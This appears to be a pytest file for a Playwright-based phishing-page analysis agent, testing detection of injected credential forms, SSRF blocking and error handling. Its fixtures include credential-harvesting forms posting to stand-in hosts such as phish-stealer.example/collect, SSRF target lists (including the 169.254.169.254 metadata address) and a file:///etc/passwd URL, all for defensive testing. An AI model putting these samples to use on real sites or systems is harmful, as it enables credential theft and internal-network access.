"""
Unit tests for Playwright-based Rendered Webpage Analysis Agent (src/webpage_agent.py).
Tests rendered DOM element detection (dynamic forms, passwords, hidden fields,
iframes, scripts, links, form destinations), SSRF and private address protections,
navigation timeouts, resource limits, and compatibility with Correlation Agent.
"""

import pytest
from src.webpage_agent import analyze_rendered_webpage, analyze_webpage_playwright, analyze_webpage
from src.correlation_agent import correlate_evidence, investigate_url


def test_dynamic_rendered_dom_detection():
    """
    Verify that Playwright executes JavaScript and detects dynamically injected
    forms, password fields, hidden inputs, iframes, external scripts, and links.
    """
    dynamic_html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Dynamic Secure Portal</title>
        <script src="https://cdn.external-scripts.example/analytics.js"></script>
    </head>
    <body>
        <div id="app">Loading application...</div>
        <a href="https://partner-portal.example/promo">Partner Link</a>
        <script>
            // Simulate client-side framework rendering (React/Vue/vanilla DOM injection)
            const app = document.getElementById("app");
            app.innerHTML = `
                <form action="https://phish-stealer.example/collect" method="POST">
                    <input type="text" name="user" value="victim@example.com" />
                    <input type="password" name="password" />
                    <input type="hidden" name="csrf_token" value="sec12345" />
                    <button type="submit">Sign In</button>
                </form>
                <iframe src="https://tracking-pixel.example/frame"></iframe>
            `;
        </script>
    </body>
    </html>
    """
    result = analyze_rendered_webpage(
        html=dynamic_html,
        url="https://legit-service.example/login"
    )

    assert result["agent"] == "Webpage Analysis Agent"
    assert result["rendering"] == "playwright"
    assert result["status"] == "completed"
    assert result["title"] == "Dynamic Secure Portal"

    # Verify detection of dynamically rendered elements
    assert result["forms_count"] == 1
    assert result["password_fields_count"] == 1
    assert result["hidden_fields_count"] == 1
    assert result["iframes_count"] == 1
    assert result["external_scripts_count"] == 1
    assert result["external_links_count"] == 1

    # Form destinations
    assert len(result["suspicious_form_actions"]) == 1
    assert result["suspicious_form_actions"][0]["destination"] == "https://phish-stealer.example/collect"
    assert result["suspicious_form_actions"][0]["method"] == "post"

    assert len(result["credential_forms"]) == 1
    assert result["credential_forms"][0]["is_external"] is True
    assert result["credential_forms"][0]["password_fields_count"] == 1

    assert result["missing_form_actions"] == []

    # Verify structured findings
    finding_types = [f["type"] for f in result["findings"]]
    assert "password_fields" in finding_types
    assert "hidden_fields" in finding_types
    assert "credential_forms" in finding_types
    assert "external_form_destinations" in finding_types
    assert "external_iframes" in finding_types
    assert "external_scripts" in finding_types
    assert "not proof of phishing" in result["note"]


def test_dynamic_relative_and_missing_actions():
    """
    Test dynamically injected forms with relative actions and missing/placeholder actions.
    Relative actions must NOT be flagged as suspicious.
    Missing actions must be recorded in missing_form_actions.
    """
    dynamic_html = """
    <html><body>
    <div id="forms-root"></div>
    <script>
        document.getElementById("forms-root").innerHTML = `
            <form action="/api/v1/auth" method="post">
                <input type="password" name="pwd1">
            </form>
            <form action="" method="post">
                <input type="password" name="pwd2">
            </form>
            <form action="#" method="get">
                <input type="text" name="query">
            </form>
            <form action="javascript:void(0)" method="post">
                <input type="password" name="pwd3">
            </form>
        `;
    </script>
    </body></html>
    """
    result = analyze_rendered_webpage(html=dynamic_html, url="https://auth-hub.example/login")

    assert result["status"] == "completed"
    assert result["forms_count"] == 4
    assert result["suspicious_form_actions"] == []
    assert len(result["missing_form_actions"]) == 3
    assert len(result["credential_forms"]) == 3

    missing_finding = next((f for f in result["findings"] if f["type"] == "missing_form_actions"), None)
    assert missing_finding is not None
    assert missing_finding["count"] == 3


def test_ssrf_blocking_initial_url():
    """
    Test that private, localhost, loopback, link-local, and internal addresses
    are immediately blocked before any browser navigation.
    """
    private_targets = [
        "http://127.0.0.1:8080/admin",
        "http://localhost:5000/api",
        "http://169.254.169.254/latest/meta-data",
        "http://10.0.0.1/router",
        "http://192.168.1.1/dashboard",
        "http://[::1]:8080/",
        "http://service.local/status",
        "http://backend.internal/info"
    ]

    for p_url in private_targets:
        result = analyze_rendered_webpage(url=p_url)
        assert result["status"] == "blocked_private_address"
        assert result["forms_count"] == 0
        finding_types = [f["type"] for f in result["findings"]]
        assert "blocked_private_address" in finding_types
        assert "blocked" in result["error_detail"].lower()


def test_ssrf_blocking_subresources():
    """
    Test that subresource requests (e.g. images, iframes) to localhost or private IPs
    are intercepted and aborted during page execution without crashing page load.
    """
    html_with_internal_subresources = """
    <html><body>
        <h1>Normal Content</h1>
        <img src="http://127.0.0.1:9090/leak" />
        <iframe src="http://localhost:8080/internal"></iframe>
    </body></html>
    """
    result = analyze_rendered_webpage(
        html=html_with_internal_subresources,
        url="https://benign-site.example/page"
    )

    assert result["status"] == "completed"
    finding_types = [f["type"] for f in result["findings"]]
    assert "blocked_subresources" in finding_types
    sub_finding = next(f for f in result["findings"] if f["type"] == "blocked_subresources")
    assert sub_finding["count"] >= 1
    assert any("127.0.0.1" in item or "localhost" in item for item in sub_finding["items"])


def test_unsafe_redirect_blocked():
    """
    Test that client-side script navigation (window.location redirect)
    to a private address is intercepted and the status is flagged as blocked_private_address.
    """
    redirect_html = """
    <html><body>
        <h1>Redirecting to internal admin...</h1>
        <script>
            window.location.href = "http://127.0.0.1:5000/admin";
        </script>
    </body></html>
    """
    result = analyze_rendered_webpage(
        html=redirect_html,
        url="https://gateway.example/go"
    )

    assert result["status"] == "blocked_private_address"
    finding_types = [f["type"] for f in result["findings"]]
    assert "blocked_private_address" in finding_types


def test_invalid_and_unsafe_schemes():
    """
    Verify that non-http/https schemes (file://, data:, gopher:) are rejected.
    """
    for unsafe_url in ["file:///etc/passwd", "gopher://evil.com/1", "data:text/html,<h1>hi</h1>"]:
        result = analyze_rendered_webpage(url=unsafe_url)
        assert result["status"] == "invalid_scheme"
        assert result["forms_count"] == 0
        assert any(f["type"] == "invalid_scheme" for f in result["findings"])


def test_empty_and_missing_input():
    """
    Verify that empty URL and None HTML input returns graceful invalid_input response.
    """
    result = analyze_rendered_webpage(url="", html=None)
    assert result["status"] == "invalid_input"
    assert result["forms_count"] == 0
    assert any(f["type"] == "invalid_input" for f in result["findings"])


def test_navigation_timeout_handling():
    """
    Verify that navigation timeouts are handled gracefully without uncaught exceptions.
    """
    from unittest.mock import MagicMock
    from playwright.sync_api import TimeoutError as PlaywrightTimeoutError

    mock_browser = MagicMock()
    mock_context = MagicMock()
    mock_page = MagicMock()

    mock_browser.new_context.return_value = mock_context
    mock_context.new_page.return_value = mock_page
    mock_page.goto.side_effect = PlaywrightTimeoutError("Navigation timed out after 5000ms")

    result = analyze_rendered_webpage(
        url="https://slow-phish.example/login",
        timeout=5.0,
        browser=mock_browser
    )
    assert result["status"] == "timeout"
    assert result["forms_count"] == 0
    assert any(f["type"] == "request_timeout" for f in result["findings"])
    assert "timed out" in result["error_detail"]


def test_connection_error_handling():
    """
    Verify that unexpected connection/browser errors are handled gracefully.
    """
    from unittest.mock import MagicMock

    mock_browser = MagicMock()
    mock_context = MagicMock()
    mock_page = MagicMock()

    mock_browser.new_context.return_value = mock_context
    mock_context.new_page.return_value = mock_page
    mock_page.goto.side_effect = Exception("net::ERR_CONNECTION_RESET")

    result = analyze_rendered_webpage(
        url="https://reset.example/login",
        browser=mock_browser
    )
    assert result["status"] == "connection_error"
    assert any(f["type"] == "connection_error" for f in result["findings"])


def test_no_form_submission_or_credential_entry():
    """
    Verify that the agent only inspects the rendered DOM and does not submit forms,
    fill credentials, or click suspicious links.
    """
    test_html = """
    <html><body>
        <form id="testForm" action="https://evil.example/collect" method="post">
            <input type="password" name="password" id="pwdField" value="">
            <input type="submit" id="submitBtn" value="Submit">
        </form>
        <script>
            window.formSubmitted = false;
            document.getElementById("testForm").addEventListener("submit", function(e) {
                window.formSubmitted = true;
            });
        </script>
    </body></html>
    """
    result = analyze_rendered_webpage(
        html=test_html,
        url="https://test.example/login"
    )

    assert result["status"] == "completed"
    assert result["forms_count"] == 1
    assert result["password_fields_count"] == 1
    # Verify suspicious action is detected without form being submitted
    assert len(result["suspicious_form_actions"]) == 1


def test_function_alias():
    """
    Verify that analyze_webpage_playwright is an exact alias of analyze_rendered_webpage.
    """
    assert analyze_webpage_playwright is analyze_rendered_webpage


def test_existing_analyze_webpage_preserved():
    """
    Verify that the existing BeautifulSoup analyze_webpage function is preserved
    and continues to work as expected.
    """
    sample_html = """
    <html><body>
        <form action="https://evil.example/post" method="post">
            <input type="password" name="pwd">
        </form>
    </body></html>
    """
    bs_result = analyze_webpage(sample_html, "https://bank.example")
    assert bs_result["agent"] == "Webpage Analysis Agent"
    assert bs_result["forms_count"] == 1
    assert bs_result["password_fields_count"] == 1
    assert len(bs_result["suspicious_form_actions"]) == 1


def test_schema_compatibility_with_correlation_agent():
    """
    Verify that the output of analyze_rendered_webpage can be directly consumed
    by correlate_evidence and investigate_url without errors.
    """
    dynamic_html = """
    <html><body>
        <form action="https://phish.example/steal" method="POST">
            <input type="password" name="pass">
        </form>
    </body></html>
    """
    web_result = analyze_rendered_webpage(
        html=dynamic_html,
        url="https://secure.example/login"
    )

    report = correlate_evidence(
        url_result={"label": "phishing", "score": 0.85},
        webpage_result=web_result,
        behaviour_result={"status": "completed", "redirect_count": 0},
        target_url="https://secure.example/login"
    )

    assert report["agent"] == "Evidence Correlation Agent"
    assert report["overall_risk"] in ("medium", "high")
    assert report["risk_score"] > 0
    assert report["agent_results"]["webpage_analysis"] is not None
    assert report["agent_results"]["webpage_analysis"]["rendering"] == "playwright"
